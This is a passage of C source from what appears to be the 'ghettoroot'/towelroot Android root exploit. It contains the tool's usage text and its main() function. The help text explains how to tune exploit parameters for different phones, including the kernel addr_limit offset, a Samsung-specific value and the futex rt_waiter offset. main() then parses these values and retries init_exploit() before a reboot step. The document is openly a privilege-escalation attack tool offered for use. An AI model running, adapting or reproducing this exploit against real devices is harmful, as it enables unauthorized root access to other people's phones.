  "  -h, --help                    Display this help message\n"
  "  --verbose                     Display full debug messages (default)\n"
  "  --brief                       Omit debug messages (not recommended)\n"
  "  -r, --retries=RETRIES         Specifies the number of times to retry the\n"
  "                                *exploit* procedures if they fail.\n"
  "  -m, --modstring=MODSTRING     Alter exploit parameters to possibly work with\n"
  "                                a greater variety of phones.\n"
  "\n"
  "  Modstring format: METHOD ALIGN LIMIT_OFFSET HIT_IOV\n"
  "   Formatting key: [Default value]PARAMETER NAME: value range: description\n"
  "   [0]METHOD: 0-sendmmsg, 1-recvmmsg, 2-sendmsg, 3-recvmsg:\n"
  "      This typically does not need to be changed.\n"
  "   [1]ALIGN: 0/1: attack all 8 IOVs hit with MAGIC\n"
  "      This behavior may/may not match up with original ALIGN behavior.\n"
  "      Currently, enabling this causes HIT_IOV to go unused.\n"
  "   [0]LIMIT_OFFSET: 0-8192: offset of addr_limit in thread_info, multiple of 4\n"
  "      If desperate, download manufacturer's kernel sources to check headers.\n"
  "      Rarely necessary, but 7380 is needed for newer Samsung models.\n"
  "   [4]HIT_IOV: 0-7: offset to rt_waiter in vulnerable futex_wait_requeue_pi.\n"
  "      see vulnerable futex_wait_requeue_pi function for your kernel if needed.\n"
  "  Note: an initial modstring value of 1337 is skipped. a trailing modstring\n"
  "        value of 0, beyond HIT_IOV, is ignored.\n"
  "\n"
  "  COMMAND: Command to be run after all other enabled features, if any.\n"
  "           All further arguments are passed along to the given command.\n"
  "\n"
  "  ex. ./ghettoroot <-- runs with defaults and tries to auto-detect modstring\n"
  "      ./ghettoroot -m \"0 1 0 4\" <-- standard, default root for most phones.\n"
  "      ./ghettoroot mkdir /system/happyface <-- gets root, then does that...\n"
  "\n"
  );
}

int main(int argc, char **argv)
{
  int c;
  char *startptr, *endptr;
  int len = 0;
  long narg = 0;
  ph = malloc(sizeof(struct phonefmt));
  opterr = 1;

  check_kernel_version();
  len = strlen(queued_msgs);

  while(1) {
    static struct option long_options[] = {
       /* These options set a flag. */
       {"verbose",         no_argument, &verbose,   1},
       {"brief",           no_argument, &verbose,   0},
       /* These options don't set a flag.
          We distinguish them by their indices. */
       {"modstring",       required_argument, 0, 'm'},
       {"help",            no_argument,       0, 'h'},
       {"retries",         required_argument, 0, 'r'},
       {0, 0, 0, 0}
    };

    /* getopt_long stores the option index here. */
    int option_index = 0;
    c = getopt_long (argc, argv, "+hm:r:",
                     long_options, &option_index);

    //fprintf(stderr, "Option %d, %c, %s\n", optind, (char)c, (optarg!=NULL)?optarg:"null");
    /* Detect the end of the options. */
    if (c == -1) {
      break;
    }
    switch (c) {
      case 'm':
        startptr = optarg;
        narg = strtoul(startptr, &endptr, 10);
        if (narg == 1337) {
          startptr = endptr;
          narg = strtoul(startptr, &endptr, 10);
        }
        if (endptr != startptr) {
          startptr = endptr;
          if (narg > 3) {
            show_usage();
            log_err("Valid values for 'method' in modstring are 0-3.");
            exit(1);
          }
          ph->method = narg;
          len += sprintf(queued_msgs + len, "ph->method = %ld", narg);
          narg = strtoul(startptr, &endptr, 10);
          if (endptr != startptr) {
            startptr = endptr;
            if (narg > 1) {
              show_usage();
              log_err("Valid values for 'align' in modstring are 0-1.");
              exit(1);
            }
            ph->align = narg;
            len += sprintf(queued_msgs + len, " ph->align = %ld ", narg);
            narg = strtol(startptr, &endptr, 10);
            if (endptr != startptr) {
              startptr = endptr;
              if (narg > 8191) {
                show_usage();
                log_err("Valid values for 'limit_offset' in modstring are 0-8191.");
                exit(1);
              }
              ph->limit_offset = narg;
              len += sprintf(queued_msgs + len, " ph->limit_offset = %ld", narg);
              narg = strtoul(startptr, &endptr, 10);
              if (endptr != startptr) {
                startptr = endptr;
                if (narg > 7) {
                  show_usage();
                  log_err("Valid values for 'hit_iov' in modstring are 0-7.");
                  exit(1);
                }
                ph->hit_iov = narg;
                len += sprintf(queued_msgs + len, " ph->hit_iov = %ld", narg);
              }
            }
          }
        }
        if(*endptr != '\0') {
          // try one more, in case 'temp_root' was included (not used)
          narg = strtoul(startptr, &endptr, 10);
          if (*endptr != '\0') {
            show_usage();
            log_err("invalid modstring: %s", optarg);
            exit(1);
          }
          else if (narg != 0) {
            show_usage();
            log_err("temp_root (final parameter of modstring) other than 0 is not supported");
            exit(1);
          }
        }
        break;
      case 'r':
        retries = strtoul(optarg, &endptr, 10);
        if(optarg == endptr) {
          show_usage();
          log_err("'retries' must be a positive number");
          exit(1);
        }
        break;
      case 'h':
        show_usage();
        exit(0);
        break;
      case '?':
        show_usage();
        log_err("Unrecognized option. See above usage text.");
        exit(1);
        break;
    }
  }

  /* Print any remaining command line arguments (not options). */
  if (optind < argc) {
    usercmd = argv[optind];
    if (*usercmd != '\0') {
      userargv = &argv[optind+1];
      userargc = argc - (optind+1);
    } else usercmd = NULL;
  }

  printf("************************************************\n");
  printf("native ghettoroot, aka cube-towel, aka towelroot\n");
  printf("running with pid %d\n", getpid());

  printf("%s\n", queued_msgs);

  setaffinity();

  printf("modstring: 1337 %ld %ld %ld %ld 0\n", ph->method, ph->align, ph->limit_offset, ph->hit_iov);
  printf("************************************************\n\n");

  while (tries++ <= retries) {
    if (init_exploit()) break;
    log_err("Exploit process failed, try %d/%d. Trying again...", tries, retries+1);
    sleep(4);
  }

  prepare_reboot();

  sleep(30);

  free(ph);

  return 0;
}
